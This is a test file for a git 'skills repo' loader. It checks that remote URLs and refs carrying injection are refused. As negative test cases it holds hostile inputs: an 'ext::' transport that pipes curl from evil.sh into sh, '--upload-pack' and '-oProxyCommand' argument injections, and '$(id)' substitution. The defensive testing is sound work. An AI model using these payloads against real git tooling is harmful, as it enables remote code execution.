import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import {
  ensureBareClone,
  isPinnedSha,
  isSafeRef,
  listRemoteSkills,
  safeRemoteFor,
} from '../../src/skills-remote.js';

// ---- safeRemoteFor: repo/URL injection guard (#428) --------------------------

test('safeRemoteFor rejects the git remote-helper RCE surface', () => {
  // `ext::`/`fd::` transports run arbitrary commands — the headline vector.
  assert.equal(safeRemoteFor("ext::sh -c 'curl evil.sh|sh'"), null);
  assert.equal(safeRemoteFor('fd::17'), null);
  // A leading `-` is argument injection against git's option surface.
  assert.equal(safeRemoteFor('--upload-pack=touch /tmp/pwn'), null);
  assert.equal(safeRemoteFor('-oProxyCommand=evil'), null);
  // Any scheme outside the transport allowlist.
  assert.equal(safeRemoteFor('ftp://evil/x.git'), null);
  assert.equal(safeRemoteFor('javascript://x'), null);
  assert.equal(safeRemoteFor(''), null);
  assert.equal(safeRemoteFor('   '), null);
  // A bare word is neither shorthand, URL, scp-like, nor a path.
  assert.equal(safeRemoteFor('not-a-real-remote'), null);
});

test('safeRemoteFor accepts the documented safe source shapes', () => {
  assert.equal(safeRemoteFor('open-mercato/skills'), 'https://github.com/open-mercato/skills.git');
  assert.equal(safeRemoteFor('https://github.com/o/n.git'), 'https://github.com/o/n.git');
  assert.equal(safeRemoteFor('http://internal.example/n.git'), 'http://internal.example/n.git');
  assert.equal(safeRemoteFor('ssh://git@host/o/n.git'), 'ssh://git@host/o/n.git');
  assert.equal(safeRemoteFor('git@github.com:o/n.git'), 'git@github.com:o/n.git');
  // Local paths / file:// stay working (a documented source shape).
  assert.equal(safeRemoteFor('/abs/path/to/repo'), '/abs/path/to/repo');
  assert.equal(safeRemoteFor('./rel/repo'), './rel/repo');
  assert.equal(safeRemoteFor('../sibling/repo'), '../sibling/repo');
  assert.equal(safeRemoteFor('file:///abs/repo'), 'file:///abs/repo');
  // `.` and `-` are in the owner/name charset, so a single-segment relative
  // path must be matched as a path first, not rewritten to a github.com URL.
  assert.equal(safeRemoteFor('./rel'), './rel');
  assert.equal(safeRemoteFor('../rel'), '../rel');
});

test('safeRemoteFor keeps Windows local paths working (BC §5: local path)', () => {
  // win32 is a supported platform and these worked before the hardening —
  // narrowing the `skillsRepos` source shape would be a breaking change.
  assert.equal(safeRemoteFor('C:\\skills'), 'C:\\skills');
  assert.equal(safeRemoteFor('C:/skills'), 'C:/skills');
  assert.equal(safeRemoteFor('d:\\team\\skills'), 'd:\\team\\skills');
  // Still not a licence for a drive-letter-shaped transport helper.
  assert.equal(safeRemoteFor('C:\\x::y'), null);
});

test('safeRemoteFor expands ~/ so git (no shell) can actually find it', () => {
  // execFile gives git no shell, so a literal `~` would be a directory name.
  assert.equal(safeRemoteFor('~/skills'), join(homedir(), 'skills'));
});

// ---- isSafeRef / isPinnedSha: ref injection guard (#428) ---------------------

test('isSafeRef rejects argument-injection and range refs', () => {
  assert.equal(isSafeRef('--output=/tmp/pwn'), false);
  assert.equal(isSafeRef('-x'), false);
  assert.equal(isSafeRef('main..evil'), false);
  assert.equal(isSafeRef('a b'), false);
  assert.equal(isSafeRef('a;b'), false);
  assert.equal(isSafeRef('$(id)'), false);
  assert.equal(isSafeRef(''), false);
});

test('isSafeRef accepts real branches, tags and SHAs', () => {
  assert.equal(isSafeRef('main'), true);
  assert.equal(isSafeRef('refs/heads/main'), true);
  assert.equal(isSafeRef('release/1.2.3'), true);
  assert.equal(isSafeRef('v1.2.3'), true);
  assert.equal(isSafeRef('a'.repeat(40)), true);
});

test('isPinnedSha recognises full sha-1 and sha-256 commit ids', () => {
  assert.equal(isPinnedSha('0'.repeat(40)), true);
  assert.equal(isPinnedSha('abcdef0123456789'.padEnd(64, '0')), true);
  assert.equal(isPinnedSha('main'), false);
  assert.equal(isPinnedSha('abc'), false); // short sha is not a pin
});

// ---- ensureBareClone refuses unsafe remotes before touching git (#428) -------

test('ensureBareClone throws on an unsafe remote instead of shelling out', async () => {
  await assert.rejects(
    ensureBareClone("ext::sh -c 'touch /tmp/pwn'"),
    /refusing unsafe skills repo remote/,
  );
});

// ---- integration: local clone still works, SHA pins, bad ref degrades --------

test('listRemoteSkills clones a local repo, pins the SHA, and refuses a bad ref', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(srcDir, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  writeFileSync(
    join(srcDir, 'SKILL.md'),
    '---\nname: demo\ndescription: a demo skill\n---\nbody text\n',
  );
  // A directory skill needs SKILL.md under a directory to be named after it.
  execFileSync('mkdir', ['-p', join(srcDir, 'greeter')]);
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  const sha = g(['rev-parse', 'HEAD']);

  await ensureBareClone(srcDir);

  // Branch ref: skills come back and record the resolved commit.
  const onMain = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = onMain.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');
  assert.equal(greeter?.team?.commit, sha);

  // Pinned SHA ref: identical result, and the pin is honoured.
  const onSha = await listRemoteSkills({ repo: srcDir, ref: sha });
  assert.ok(onSha.some((s) => s.name === 'greeter'));

  // A wrong pinned SHA resolves to nothing (no HEAD fallback).
  const wrong = await listRemoteSkills({ repo: srcDir, ref: 'f'.repeat(40) });
  assert.deepEqual(wrong, []);

  // An injection ref is refused outright.
  const evil = await listRemoteSkills({ repo: srcDir, ref: '--output=/tmp/pwn' });
  assert.deepEqual(evil, []);
});
